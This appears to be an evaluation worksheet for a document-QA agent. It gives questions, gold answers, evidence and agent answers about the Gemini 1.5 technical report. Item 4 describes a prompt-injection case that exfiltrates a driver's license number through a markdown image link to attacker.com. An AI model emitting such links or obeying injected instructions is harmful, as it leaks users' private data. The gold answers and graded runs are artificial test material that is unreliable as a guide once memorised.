# Advanced Multimodal Audit Worksheet

## 1. `dev_table_1` (`table`)
- **Question:** According to Table 2 on page 3, what is Gemini 1.5 Flash's win-rate relative to Gemini 1.0 Ultra on Vision benchmarks (both percentage and benchmark ratio)?
- **Gold / Expected:** 61.9% (13/21 benchmarks).
- **Gold Evidence:** Table 2 (p.3), row 'Vision', column 'Relative to 1.0 Ultra': Win-rate: 61.9% (13/21 benchmarks). (pages: [3])
- **Status:** `ok` | **Decision:** `answered` | **Viewed:** `['p003_table_2']`
- **Citations:** `['p003_table_2']`
- **Agent Answer:** According to Table 2 on page 3, Gemini 1.5 Flash's win-rate relative to Gemini 1.0 Ultra on Vision benchmarks is 61.9%, corresponding to 13 out of 21 benchmarks.

## 2. `dev_table_2` (`table`)
- **Question:** In Table 18 on page 39, which model achieves the highest score on DUDE (test), and what is its score?
- **Gold / Expected:** Gemini 1.5 Flash with 48% (compared to 46% for Gemini 1.5 Pro, 44% for 1.0 Ultra, and 39% for 1.0 Pro).
- **Gold Evidence:** Table 18 (p.39), row 'DUDE (test)': 1.0 Pro 39%, 1.0 Ultra 44%, 1.5 Flash 48% (bold blue), 1.5 Pro 46%. (pages: [39])
- **Status:** `ok` | **Decision:** `answered` | **Viewed:** `['p039_table_1']`
- **Citations:** `['p039_table_1']`
- **Agent Answer:** The model that achieves the highest score on DUDE (test) in Table 18 on page 39 is Gemini 1.5 Flash, with a score of 48%.

## 3. `dev_table_3` (`table`)
- **Question:** According to Table 21 on page 43, what are the single-greedy-decoding and rm@256 scores of Math-Specialized Gemini 1.5 Pro on AIME 2024?
- **Gold / Expected:** 7/30 (single greedy decoding) and 8/30 (rm@256).
- **Gold Evidence:** Table 21 (p.43), row 'AIME 2024', column 'Math-Specialized 1.5 Pro': 7/30 and 8/30 rm@256. (pages: [43])
- **Status:** `ok` | **Decision:** `answered` | **Viewed:** `['p043_table_1']`
- **Citations:** `['p043_table_1']`
- **Agent Answer:** According to Table 21 on page 43, the single-greedy-decoding score of Math-Specialized Gemini 1.5 Pro on AIME 2024 is 7/30, and the rm@256 score is 8/30.

## 4. `dev_img_1` (`image_diagram`)
- **Question:** In Figure 23 on page 61, what sensitive value from the conversation history is exfiltrated in the successful prompt injection attack, and to what URL parameter?
- **Gold / Expected:** The user's driver's license number K1455236, exfiltrated via the markdown image URL parameter `param=K1455236` (`https://attacker.com/img.jpg?param=K1455236`).
- **Gold Evidence:** Figure 23 (p.61), steps (2)-(4): driver's license number K1455236 embedded in `![resort](https://attacker.com/img.jpg?param=K1455236)`. (pages: [61])
- **Status:** `ok` | **Decision:** `answered` | **Viewed:** `['p061_figure_1']`
- **Citations:** `['p061_figure_1']`
- **Agent Answer:** In Figure 23 on page 61, the sensitive value exfiltrated from the conversation history in the successful prompt injection attack is the driver's license number "K1455236". This value is sent as the value of the URL parameter "param" in the malicious Markdown image link: `https://attacker.com/img.jpg?param=K1455236`.

## 5. `dev_img_2` (`image_diagram`)
- **Question:** In Figure 31 on page 149 (BetterChartQA examples), in which step of the Flowchart example does 'Build MySQL based relational database' occur, and what is the Ground truth peak location in the Scatter plot example?
- **Gold / Expected:** In the Flowchart example it occurs in the 'Preprocessing Step'; in the Scatter plot example the Ground truth is option 'a' corresponding to (0.1, 1.5).
- **Gold Evidence:** Figure 31 (p.149): middle panel 'Scatter plot' Ground truth: a ((0.1, 1.5)); right panel 'Flowchart' Ground truth: Preprocessing Step. (pages: [149])
- **Status:** `ok` | **Decision:** `answered` | **Viewed:** `['p149_full', 'p149_full']`
- **Citations:** `['p149_full']`
- **Agent Answer:** In Figure 31 on page 149:
- The step in the Flowchart example where 'Build MySQL based relational database' occurs is the 'Preprocessing Step.'
- The Ground truth peak location in the Scatter plot example is at (0.1, 1.5).

## 6. `dev_chart_1` (`chart`)
- **Question:** In Figure 10 (Audio Haystack) on page 14, up to how many hours of audio does Gemini 1.5 Pro achieve 100% green recall (zero red cells), and what are the tick marks on the Minutes axis of the 'Up to 107 hours' panel?
- **Gold / Expected:** Up to 107 hours with zero red cells; the Minutes axis ticks are 640, 1920, 3200, 4480, and 5760.
- **Gold Evidence:** Figure 10 (p.14), top-right panel 'Up to 107 hours': all cells green, x-axis ticks 640, 1920, 3200, 4480, 5760 Minutes. (pages: [14])
- **Status:** `ok` | **Decision:** `answered` | **Viewed:** `['p014_figure_1']`
- **Citations:** `['p014_figure_1']`
- **Agent Answer:** In Figure 10 (Audio Haystack) on page 14, Gemini 1.5 Pro achieves 100% green recall (zero red cells) for up to 107 hours of audio, as shown by the absence of any red cells in both the main (up to 11 hours) and the extended (up to 107 hours) panels.

The tick marks on the Minutes axis of the 'Up to 107 hours' panel are: 640, 1920, 3200, 4480, and 5760 minutes.

## 7. `dev_chart_2` (`chart`)
- **Question:** In Figure 13 on page 20, what is the maximum Number of Shots (K) shown on the x-axis for the top-row Flores plots vs. the bottom-row In-house plots?
- **Gold / Expected:** 2^10 (~1K shots) for the top-row Flores sets, and 2^12 (~4K shots) for the bottom-row in-house sets.
- **Gold Evidence:** Figure 13 (p.20): top plots x-axis ends at 2^10 (~1K shots in caption); bottom plots x-axis ends at 2^12 (~4K shots in caption). (pages: [20])
- **Status:** `ok` | **Decision:** `answered` | **Viewed:** `['p020_full', 'p020_figure_2']`
- **Citations:** `['p020_figure_2']`
- **Agent Answer:** In Figure 13 on page 20, the maximum Number of Shots (K) shown on the x-axis is:
- For the top-row Flores plots: 2^{10} = 1024 shots (approximately 1K)
- For the bottom-row In-house plots: 2^{12} = 4096 shots (approximately 4K)

This is visually confirmed by the x-axis tick labels in the respective plots.

## 8. `dev_chart_3` (`chart`)
- **Question:** In Figure 19 on page 38, which two industries show the highest percent time saved for Gemini 1.5 Pro, and what are their values?
- **Gold / Expected:** Programming (0.75) and Photography (0.73).
- **Gold Evidence:** Figure 19 (p.38): green bars (Gemini 1.5 Pro) peak at Programming (0.75) and Photography (0.73). (pages: [38])
- **Status:** `ok` | **Decision:** `answered` | **Viewed:** `['p038_figure_1']`
- **Citations:** `['p038_figure_1']`
- **Agent Answer:** In Figure 19 on page 38, the two industries that show the highest percent time saved for Gemini 1.5 Pro are Programming (0.75) and Photography (0.73).

## 9. `dev_multi_1` (`multi_hop`)
- **Question:** Compare Gemini 1.5 Pro's accuracy on 1H-VideoQA (all frames / 1 fps) in Table 9 (p.25) with its Audio Haystack recall at 107 hours in Figure 10 (p.14).
- **Gold / Expected:** On 1H-VideoQA with full video (1 fps) Gemini 1.5 Pro achieves 72.2% accuracy (Table 9, p.25), whereas on Audio Haystack up to 107 hours it achieves 100% green needle recall (Figure 10, p.14).
- **Gold Evidence:** Table 9 (p.25) gives 72.2% at full video (1 fps); Figure 10 (p.14) shows all green cells up to 107 hours. (pages: [14, 25])
- **Status:** `ok` | **Decision:** `answered` | **Viewed:** `['p025_table_1', 'p014_figure_1']`
- **Citations:** `['p025_table_1', 'p014_figure_1']`
- **Agent Answer:** On the 1H-VideoQA benchmark (Table 9, p.25), Gemini 1.5 Pro achieves an accuracy of 72.2% when provided with all frames at 1 fps. In contrast, Figure 10 (p.14) shows that in the Audio Haystack experiment, Gemini 1.5 Pro achieves perfect recall (100%) at up to 107 hours of audio, as indicated by all green squares (correct keyword identification) across all tested durations and depths. Thus, Gemini 1.5 Pro's recall on the Audio Haystack task at 107 hours is higher (100%) than its accuracy on 1H-VideoQA with all frames (72.2%).

## 10. `dev_multi_2` (`multi_hop`)
- **Question:** Using Table 20 on page 42, which model achieves the best score on YouTube (52 lang) WER, and by how many percentage points does it outperform Whisper (v3)?
- **Gold / Expected:** Gemini 1.0 Ultra achieves the best WER at 21.0%, outperforming Whisper (v3) at 41.4% by 20.4 percentage points.
- **Gold Evidence:** Table 20 (p.42), row 'YouTube (52 lang)': Gemini 1.0 Ultra 21.0%, Whisper 41.4% (v3); 41.4 - 21.0 = 20.4. (pages: [42])
- **Status:** `ok` | **Decision:** `answered` | **Viewed:** `['p042_full']`
- **Citations:** `['p042_full']`
- **Agent Answer:** According to Table 20 on page 42, the model that achieves the best score on YouTube (52 lang) WER is Gemini 1.0 Ultra, with a WER of 21.0%. Whisper (v3) has a WER of 41.4%. Therefore, Gemini 1.0 Ultra outperforms Whisper (v3) by 20.4 percentage points (41.4% - 21.0%).

## 11. `dev_multi_3` (`multi_hop`)
- **Question:** From Figure 26 on page 65, what is Gemini 1.0 Ultra's Bias score on BBQ (4-shot) for Age in the ambiguous split, and what is Gemini 1.5 Pro's corresponding Bias score and Accuracy on that same cell?
- **Gold / Expected:** Gemini 1.0 Ultra has Bias score 27.5 on ambiguous Age, while Gemini 1.5 Pro has Bias score 0.38 and Accuracy 1.0.
- **Gold Evidence:** Figure 26 (p.65), panel (a) ambiguous Age: 1.0 Ultra = 27.5, 1.5 Pro = 0.38; panel (b) ambiguous Age: 1.5 Pro = 1.0. (pages: [65])
- **Status:** `ok` | **Decision:** `answered` | **Viewed:** `['p065_figure_1']`
- **Citations:** `['p065_figure_1']`
- **Agent Answer:** From Figure 26 on page 65:
- Gemini 1.0 Ultra's Bias score on BBQ (4-shot) for Age in the ambiguous split is **27.5**.
- Gemini 1.5 Pro's corresponding Bias score is **0.38**, and its Accuracy is **1.0** for that same cell (Age, ambiguous split).

## 12. `dev_text_1` (`text`)
- **Question:** According to page 2, what are the exact context token lengths (and corresponding hours/words) where Gemini 1.5 Pro maintains >99.7% needle recall across text, audio, and video?
- **Gold / Expected:** 10M tokens in text (~7M words), 9.7M tokens in audio (up to 107 hours), and 9.9M tokens in video (up to 10.5 hours).
- **Gold Evidence:** Page 2 (Figure 1 caption): 10M tokens text (~7M words), 9.7M tokens audio (up to 107 hours), 9.9M tokens video (up to 10.5 hours). (pages: [2])
- **Status:** `ok` | **Decision:** `answered` | **Viewed:** `['p002_full']`
- **Citations:** `['p002_full']`
- **Agent Answer:** According to page 2 and Figure 1 of the Gemini 1.5 Technical Report, Gemini 1.5 Pro maintains greater than 99.7% needle recall up to the following context lengths for each modality:

- Text: Up to 10 million tokens (approximately 7 million words)
- Audio: Up to 9.7 million tokens (up to 107 hours)
- Video: Up to 9.9 million tokens (up to 10.5 hours)

For all three modalities, Gemini 1.5 Pro achieves >99.7% needle recall up to 1 million tokens, and maintains this performance up to the longer context lengths listed above for each modality.

These values are explicitly stated in the caption of Figure 1 and the main text on page 2.

## 13. `dev_text_2` (`text`)
- **Question:** According to Section 3.2 on page 6, how is Gemini 1.5 Flash trained from Gemini 1.5 Pro to achieve lower latency while maintaining quality?
- **Gold / Expected:** It uses parallel computation of attention and feedforward components, is online distilled from Gemini 1.5 Pro, and is trained with higher-order preconditioned methods.
- **Gold Evidence:** Page 6, Section 3.2: parallel computation of attention and feedforward components, online distilled from Gemini 1.5 Pro, higher-order preconditioned methods. (pages: [6])
- **Status:** `ok` | **Decision:** `answered` | **Viewed:** `[]`
- **Citations:** `['gemini-1-5-report:p006:text:001']`
- **Agent Answer:** According to Section 3.2 on page 6, Gemini 1.5 Flash is trained from Gemini 1.5 Pro to achieve lower latency while maintaining quality through the following methods:

- Gemini 1.5 Flash is a transformer decoder model with the same 2M+ context and multimodal capabilities as Gemini 1.5 Pro, but is designed for efficient utilization of tensor processing units (TPUs) with lower latency for model serving.
- It performs parallel computation of attention and feedforward components, which contributes to reduced latency.
- Gemini 1.5 Flash is online distilled from the much larger Gemini 1.5 Pro model, meaning it learns to mimic the outputs of the Pro model in a more efficient architecture.
- It is trained with higher-order preconditioned methods for improved quality.

These combined techniques allow Gemini 1.5 Flash to achieve lower latency while maintaining high quality similar to Gemini 1.5 Pro.

(Source: Section 3.2, page 6)

## 14. `dev_text_3` (`text`)
- **Question:** According to Section 4 on page 7, what hardware accelerators are used to train Gemini 1.5 models?
- **Gold / Expected:** Multiple 4096-chip pods of Google's TPUv4 accelerators distributed across multiple datacenters.
- **Gold Evidence:** Page 7, Section 4: 'multiple 4096-chip pods of Google’s TPUv4 accelerators, distributed across multiple datacenters'. (pages: [7])
- **Status:** `ok` | **Decision:** `answered` | **Viewed:** `[]`
- **Citations:** `['gemini-1-5-report:p007:text:000']`
- **Agent Answer:** According to Section 4 on page 7, Gemini 1.5 models are trained on multiple 4096-chip pods of Google’s TPUv4 accelerators, distributed across multiple data centers.

## 15. `dev_text_4` (`text`)
- **Question:** According to Section 8 on page 45, what three large-scale deployment use cases are highlighted for Gemini 1.5 Flash-8B?
- **Gold / Expected:** Large-Scale Data Labeling, High-Throughput Agent Serving, and Model Integration in Complex Workflows.
- **Gold Evidence:** Page 45, Section 8 bullet list: Large-Scale Data Labeling, High-Throughput Agent Serving, Model Integration in Complex Workflows. (pages: [45])
- **Status:** `ok` | **Decision:** `answered` | **Viewed:** `[]`
- **Citations:** `['gemini-1-5-report:p045:text:000', 'gemini-1-5-report:p045:text:001']`
- **Agent Answer:** According to Section 8 on page 45, the three large-scale deployment use cases highlighted for Gemini 1.5 Flash-8B are:

1. Large-Scale Data Labeling: Flash-8B’s efficiency enables the automated labeling of massive datasets, accelerating the training process for other downstream models.
2. High-Throughput Agent Serving: Flash-8B can power intelligent agents deployed at scale, facilitating real-time interactions with a large user base.
3. Model Integration in Complex Workflows: Flash-8B’s speed facilitates its integration into intricate workflows involving multiple models working in tandem, unlocking sophisticated capabilities.

These use cases are explicitly listed in Section 8 on page 45.

## 16. `dev_unans_1` (`unanswerable`)
- **Question:** What is the exact total parameter count (in billions) of Gemini 1.5 Pro reported in the paper?
- **Gold / Expected:** Abstain: the report does not disclose the parameter count of Gemini 1.5 Pro.
- **Gold Evidence:** Verified absent across all 154 pages ('billion parameters' / 'trillion parameters' = 0 hits). (pages: [])
- **Status:** `ok` | **Decision:** `abstain` | **Viewed:** `[]`
- **Citations:** `[]`
- **Agent Answer:** The Gemini 1.5 Technical Report does not explicitly report the exact total parameter count (in billions) for Gemini 1.5 Pro in any of the retrieved text or tables, including the model card (Table 45) and surrounding context. No direct value for the parameter count is provided in the document.

## 17. `dev_unans_2` (`unanswerable`)
- **Question:** What score does Gemini 1.5 Pro achieve on the SWE-bench Verified benchmark in this report?
- **Gold / Expected:** Abstain: SWE-bench Verified is not evaluated or mentioned in the report.
- **Gold Evidence:** Verified absent across all 154 pages ('SWE-bench' = 0 hits). (pages: [])
- **Status:** `ok` | **Decision:** `abstain` | **Viewed:** `[]`
- **Citations:** `[]`
- **Agent Answer:** The Gemini 1.5 Technical Report does not contain a reported score for Gemini 1.5 Pro on the SWE-bench Verified benchmark. Multiple searches for 'SWE-bench Verified' and related tables or figures did not yield any relevant results or scores for this benchmark.

## 18. `dev_unans_3` (`unanswerable`)
- **Question:** What optimizer and peak learning rate schedule were used to pre-train Gemini 1.5 Flash?
- **Gold / Expected:** Abstain: optimizer hyperparameters and learning rate schedules are not reported.
- **Gold Evidence:** Verified absent across all 154 pages ('learning rate' = 0 hits, 'AdamW' = 0 hits). (pages: [])
- **Status:** `ok` | **Decision:** `answered` | **Viewed:** `[]`
- **Citations:** `['gemini-1-5-report:p006:text:001']`
- **Agent Answer:** Gemini 1.5 Flash was pre-trained using higher-order preconditioned optimization methods, as referenced by Becker and LeCun (1989), Duchi et al. (2011), and Heskes (2000). The report does not specify the exact optimizer name (e.g., Adam, Adafactor, Shampoo) or provide the precise peak learning rate schedule used for Gemini 1.5 Flash pre-training. The details given are that higher-order preconditioned methods were used for improved quality, but no further specifics on the learning rate schedule are provided in the technical report.

Source: Section 3.2, page 6.
